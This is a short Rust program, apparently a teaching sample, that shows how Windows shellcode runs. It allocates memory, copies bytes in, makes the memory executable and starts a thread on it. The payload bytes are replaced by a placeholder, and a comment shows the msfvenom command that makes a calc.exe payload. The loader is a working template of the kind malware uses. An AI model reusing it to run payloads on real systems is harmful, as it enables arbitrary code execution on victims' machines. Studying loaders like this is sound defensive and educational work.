/*
    Simple Payload Execution With Explanation.
    Pov: Just wrote this program for teaching my friends about how shellcode works and executes when it comes to windows
    @5mukx
*/


// Importing winapi from crates

use std::ptr::{copy, null_mut};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("[-] {}", format!($msg, $($arg), *));
        return;
    }
}

macro_rules! okey {
    ($msg:expr) => {
        println!("[+] {}", format!($msg));
    }
}

fn main() {
    // Generating sample calc shellcode using metasploit
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let shellcode: [u8; 276] = [
        SHELLCODE_PLACEHOLDER
    ];

    /*
    Why unsafe ? : some operations require bypassing these safety checks for low-level
    memory manipulation, interacting with hardware, or calling foreign functions (e.g., WinAPI in this case).
    */
    unsafe {

        okey!("Allocating memory for the shellcode with read/write permissions");
        let shellcode_addr = VirtualAlloc(
            null_mut(),                   // address hint (nullptr means the system chooses the address)
            shellcode.len(),              // size of the memory block
            MEM_COMMIT | MEM_RESERVE,     // allocation type
            PAGE_READWRITE,               // memory protection
        );

        // checking if memory allocation was successful
        if shellcode_addr.is_null() {
            error!("VirtualAlloc failed {}", GetLastError());
        }

        println!("[+] Shellcode Addr: {:?}", shellcode_addr);

        okey!("Copy the shellcode to the allocated memory");
        copy(shellcode.as_ptr(), shellcode_addr as *mut u8, shellcode.len());

        okey!("Change the memory protection to executable");

        let mut old_protection = 0;

        let virtualprotect = VirtualProtect(
            shellcode_addr, // Starting Page Address
            shellcode.len(), // Shellcode size
            PAGE_EXECUTE_READWRITE, // Memory protection Option , Either Exec, Read, or Readwrite
            &mut old_protection // Previous protection
        );

        if virtualprotect == 0 {
            error!("VirtualProtect failed {}", GetLastError());
        }

        okey!("Creating thread to execute the shellcode");

        let hthread = CreateThread(
            null_mut(),                   // Security attributes
            0,                                  // Stack size (0 means default)
            Some(std::mem::transmute(shellcode_addr)),  // Thread start address
            null_mut(),                         // Thread parameter
            0,                              // Creation flags
            null_mut(),                         // Thread ID
        );

        println!("Thread Address: {:?}", hthread);

        if hthread.is_null() {
            error!("[!] CreateThread failed {}", GetLastError());
        }

        // waiting for the created thread to finish execution
        okey!("[+] Shellcode Executed!");
        WaitForSingleObject(hthread, 0xFFFFFFFF); // 0xFFFFFFFF means to wait for INFINITE times ..!
    }
}
